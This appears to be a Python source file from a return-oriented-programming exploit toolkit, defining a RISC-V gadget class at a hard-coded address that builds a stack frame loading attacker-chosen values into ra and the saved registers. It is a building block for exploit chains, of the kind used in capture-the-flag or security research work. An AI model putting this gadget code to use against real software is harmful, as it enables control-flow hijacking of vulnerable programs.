from bf_parser.rop_gadgets_base_class import ROP_Gadget
import struct

class Charger(ROP_Gadget):
    '''
    ld ra, 0x68(sp)
    ld s0, 0x60(sp)
    ld s1, 0x58(sp)
    ld s2, 0x50(sp)
    ld s3, 0x48(sp)
    ld s4, 0x40(sp)
    ld s5, 0x38(sp)
    ld s6, 0x30(sp)
    ld s7, 0x28(sp)
    ld s8, 0x20(sp)
    ld s9, 0x18(sp)
    ld s10, 0x10(sp)
    ld s11, 0x8(sp)
    addi sp, sp, 0x70
    jr ra
    '''

    def __init__(self):
        super().__init__(0x4799e, 0x70)

    def print_vaddr(self):
        return struct.pack("q", self.get_vaddr())

    def construct_frame(self, ra=0, \
                        s0=0, \
                        s1=0, \
                        s2=0, \
                        s3=0, \
                        s4=0, \
                        s5=0, \
                        s6=0, \
                        s7=0, \
                        s8=0, \
                        s9=0, \
                        s10=0, \
                        s11=0 \
                        ):

        data = [0, s11, s10, s9, s8, s7, s6, s5, s4, s3, s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()